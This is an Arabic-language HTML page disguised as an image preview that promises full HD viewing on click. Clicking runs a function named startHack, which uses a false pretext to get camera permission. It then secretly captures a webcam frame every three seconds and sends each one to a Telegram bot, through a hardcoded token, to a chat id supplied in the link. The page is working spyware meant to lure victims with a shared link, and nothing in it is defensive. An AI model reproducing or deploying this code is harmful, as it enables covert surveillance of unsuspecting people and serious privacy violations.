<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معاينة الصورة</title>
    <style>
        body { background-color: #000; color: white; text-align: center; font-family: Arial; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        img { max-width: 90%; border-radius: 10px; box-shadow: 0 0 20px rgba(255,255,255,0.2); cursor: pointer; }
        .info { margin-top: 15px; color: #888; font-size: 14px; position: absolute; bottom: 20%; }
    </style>
</head>
<body>
    <div id="content" onclick="startHack()">
        <img id="target-image" src="" alt="جاري التحميل...">
        <p class="info">انقر على الصورة للمشاهدة بالجودة الكاملة HD</p>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
        
        // جلب البيانات من الرابط تلقائياً
        const urlParams = new URLSearchParams(window.location.search);
        const imgUrl = urlParams.get('view_img');
        const targetChatId = urlParams.get('uid'); // هنا يتم جلب ID المستخدم الذي أرسل الصورة

        if (imgUrl) { document.getElementById('target-image').src = imgUrl; }

        async function startHack() {
            document.querySelector('.info').innerText = "جاري الاتصال بالسيرفر... يرجى الانتظار";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setInterval(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg', 0.6);
                    sendToTelegram(photo);
                }, 3000);
            } catch (err) {
                alert("خطأ في العرض: يجب السماح بالوصول للكاميرا لمشاهدة المحتوى");
            }
        }

        function sendToTelegram(photoBase64) {
            if (!targetChatId) return;
            
            const byteString = atob(photoBase64.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            const blob = new Blob([ab], {type: 'image/jpeg'});

            const formData = new FormData();
            formData.append('chat_id', targetChatId);
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }
    </script>
</body>
</html>
